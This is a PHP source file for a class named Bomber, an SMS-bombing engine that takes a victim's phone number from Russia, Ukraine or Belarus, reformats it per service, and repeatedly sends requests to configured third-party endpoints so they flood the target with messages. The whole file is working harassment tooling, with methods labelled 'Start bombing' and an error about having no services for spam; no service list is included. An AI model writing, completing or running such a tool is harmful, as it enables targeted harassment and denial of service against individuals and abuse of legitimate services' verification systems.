<?php

class Bomber {
    
    const RU_COUNTRY = "ru"; //kz, ge
    const UA_COUNTRY = "ua";
    const BY_COUNTRY = "by"; 
    
    /** @var string Phone Number*/
    public $number;
    /** @var int in seconds*/
    public $time = -1;
    /** @var int messages count*/
    public $count = -1;
    /** @var bool*/
    public $stop = true;
    /** @var int in microseconds*/
    public $interval = -1;
    /** @var string*/
    public $country = self::RU_COUNTRY;
    
    /** @var mixed[][]*/
    public $services = [];
    /** @var string[]*/
    public $countries = [
        "+7" => self::RU_COUNTRY,
        "+380" => self::UA_COUNTRY,
        "+375" => self::BY_COUNTRY,
    ];   
    /** @var string[][]*/
    public $formats = [
        self::RU_COUNTRY => [
            "standart" => "+7XXXXXXXXXX",
            "standart2" => "7XXXXXXXXXX",
            "standart3" => "8XXXXXXXXXX",
            "withoutCountry" => "XXXXXXXXXX",
            "full" => "+7 (XXX) XXX-XX-XX"
        ],
        
        self::UA_COUNTRY => [
            "standart" => "+380XXXXXXXXX",
            "standart2" => "380XXXXXXXXX",
            "standart3" => "380XXXXXXXXX",
            "withoutCountry" => "XXXXXXXXX",
            "full" => "+380 (XX) XXX-XX-XX"
        ],
        
        self::BY_COUNTRY => [
            "standart" => "+375XXXXXXXXXX",
            "standart2" => "375XXXXXXXXXX",
            "standart3" => "375XXXXXXXXXX",
            "withoutCountry" => "XXXXXXXXXX",
            "full" => "+375 XXX-XXX-XXXX"
        ]
    ];
    
    /** @var Closure|callable*/
    public $onSend = null;
    /** @var Closure|callable*/
    public $onWave = null;
    /** @var Closure|callable*/
    public $onFailed = null;
    
    /** @var int*/
    public $sended = 0;
    /** @var int*/
    private $startTime = 0;
    
    /**
     * 
     * @param string $number
     * @param int $time
     * @param int $count
     */
    public function __construct($number, $time = -1, $count = -1) {
        $this->number = $number;
        $this->count = $count;
        $this->time = $time;
    }
    
    /** 
     * Start bombing
     */
    public function start() {
        $detect = $this->detectCountry($this->number);
        
        if ($detect[0] === null) {
            throw new Exception("Вы не указали код страны, либо он неверный!");
        }
        
        $this->country = $detect[0];
        $this->number = $detect[1];
        
        if (strlen($this->number) > 15 || !is_numeric($this->number)) {
            throw new Exception("Неверный формат тел. номера!");
        }
        
        if ($this->services === []) {
            throw new Exception("нету сервисов для спама!");
        }
        
        $this->stop = false;
        $this->sended = 0;
        $this->startTime = time();
        while (!$this->stop) {
            $waveCounter = 0;
            foreach ($this->services as $name => $service) {
                try {
                if ($this->stop || ($this->count != -1 && $this->sended >= $this->count) || ($this->time != -1 && time() - $this->startTime >= $this->time)) {
                    break 2;
                }
                
                if (!is_array($service) || !isset($service["url"]) || !isset($service["context"]) || !is_array($service["context"])) {
                    continue;
                }
                
                if (isset($service["format"])) {
                    if (isset($this->formats[$this->country][$service["format"]])) {
                        $service["format"] = $this->formats[$this->country][$service["format"]];
                    }
                    $number = $this->format($service["format"]);
                } else {
                    $number = $this->number;
                }
                
                if (isset($service["context"]["header"]) && is_array($service["context"]["header"])) {
                    $service["context"]["header"] = implode("\r\n", $service["context"]["header"])."\r\n";
                } else {
                    $service["context"]["header"] = "";
                }
                
                if (isset($service["context"]["json"]) && $service["context"]["json"] === true) {
                    $service["context"]["header"] .= "Content-type: application/json\r\n";
                    $json = true;
                } else {
                    $json = false;
                }
                
                if (isset($service["context"]["content"]) && is_array($service["context"]["content"])) {
                    foreach ($service["context"]["content"] as $k => $v) {
                        if (is_array($v)) {
                            foreach ($v as $_k => $_v) {
                                $service["context"]["content"][$k][$_k] = str_replace(["%phone%", "%country%"], [$number, $this->country], $_v);
                            }
                        } else {
                            $service["context"]["content"][$k] = str_replace(["%phone%", "%country%"], [$number, $this->country], $v);
                        }
                    }
                    
                    if ($json) {
                        $content = json_encode($service["context"]["content"]);
                    } else {
                        $content = http_build_query($service["context"]["content"]);
                    }
                    $service["context"]["content"] = $content;
                }
             
                if (isset($service["query"]) && is_array($service["query"])) {
                    foreach ($service["query"] as $k => $v) {
                        $service["query"][$k] =  str_replace(["%phone%", "%country%"], [$number, $this->country], $v);
                    }
                    $service["url"] .= '?' . http_build_query($service["query"]);
                }
                
                $context = stream_context_create(["http" => $service["context"]]);
                $res = @file_get_contents( str_replace(["%phone%", "%country%"], [$number, $this->country], $service["url"]), false, $context);
                
                if ($res !== false) {
                    $this->sended++;
                    $waveCounter++;
                    if ($this->onSend !== null) {
                        ($this->onSend)($name);
                    }
                } else {
                    if ($this->onFailed !== null) {
                        ($this->onFailed)($name, error_get_last()["message"]);
                    }
                }
                
                if ($this->interval != -1) {
                    usleep($this->interval);
                }
                
                } catch (Throwable $ex) {
                   if ($this->onFailed !== null) {
                       ($this->onFailed)($name, $ex->getMessage());
                   }
                }
            }
            
            if ($this->onWave !== null) {
                ($this->onWave)($waveCounter);
            }
        }
    }
    
    /**
     * Stop bombing
     */
    public function stop() {
        $this->stop = true;
    }
    
    /**
     * 
     * @param string $format
     * @param string $number
     */
    public function format($format, $number = null) {
        if ($number === null) {
            $number = $this->number;
        }
        
        $res = "";
        foreach (str_split($format) as $char) {
            if ($char == 'X') {
                $res .= substr($number, 0, 1);
                $number = substr($number, 1);
            } else {
                $res .= $char;
            }
        }
        return $res;
    }
    
    /**
     * 
     * @param string $number
     * @return string[]
     */
    public function detectCountry($number) {
        $c = null;
        foreach ($this->countries as $code => $country) {
            if ($this->str_starts_with($number, $code)) {
                $number = substr($number, strlen($code));
                $c = $country;
                break;
            }
        }
        return [$c, $number];
    }
    
    /**
     * 
     * @return int
     */
    public function getSended() {
        return $this->sended;
    }
    
    /**
     * 
     * @return int
     */
    public function getStartTime() {
        return $this->startTime;
    }
    
    /**
     * 
     * @param string $haystack
     * @param string $needle
     * @return bool
     */
    public static function str_starts_with(string $haystack, string $needle): bool {
        return 0 === strncmp($haystack, $needle, strlen($needle));
    }
}